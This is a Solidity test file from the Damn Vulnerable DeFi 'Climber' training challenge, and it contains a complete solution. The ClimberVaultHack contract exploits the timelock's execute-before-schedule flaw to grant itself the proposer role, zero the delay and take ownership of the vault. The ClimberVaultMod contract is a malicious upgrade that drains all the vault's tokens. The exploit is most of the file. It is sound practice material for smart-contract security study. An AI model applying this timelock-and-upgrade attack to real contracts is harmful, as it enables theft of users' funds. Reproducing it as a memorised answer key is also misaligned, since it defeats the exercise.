// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        ClimberVaultHack hackContract = new ClimberVaultHack(timelock, vault, recovery);

        hackContract.execute();

        hackContract.upgradeAndDrain(address(token));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract ClimberVaultHack {
    // keccak256("ADMIN_ROLE");
    bytes32 ADMIN_ROLE = 0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775;

    // keccak256("PROPOSER_ROLE");
    bytes32 PROPOSER_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;

    address[] targets = new address[](4);
    //already have 0 value
    uint256[] values = new uint256[](4);

    bytes32 salt = bytes32(0);

    bytes[] dataElements = new bytes[](4);

    ClimberTimelock timelock;

    address recovery;

    ClimberVault vault;

    constructor(ClimberTimelock _timelock, ClimberVault _vault, address _recovery) {
        timelock = _timelock;
        recovery = _recovery;
        vault = _vault;

        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(vault);
        targets[3] = address(this);

        dataElements[0] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0x00);
        // dataElements[2] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[2] = abi.encodeWithSignature("transferOwnership(address)", address(this));

        dataElements[3] = abi.encodeWithSignature("schedule()");
    }

    function execute() public {
        timelock.execute(targets, values, dataElements, salt);
    }

    function schedule() public {
        timelock.schedule(targets, values, dataElements, salt);
    }

    function upgradeAndDrain(address token) public {
        ClimberVaultMod vaultMod = new ClimberVaultMod();

        vault.upgradeToAndCall(address(vaultMod), "");
        // abi.encodeCall(ClimberVaultMod.initialize, ()) // initialization data

        ClimberVaultMod(address(vault)).withdrawFunds(token, recovery);
    }
}

contract ClimberVaultMod is ClimberVault {
    function initialize() public initializer {
        _disableInitializers();
    }

    function withdrawFunds(address tokenAddress, address recovery) external onlyOwner {
        SafeTransferLib.safeTransfer(tokenAddress, recovery, IERC20(tokenAddress).balanceOf(address(this)));
    }
}
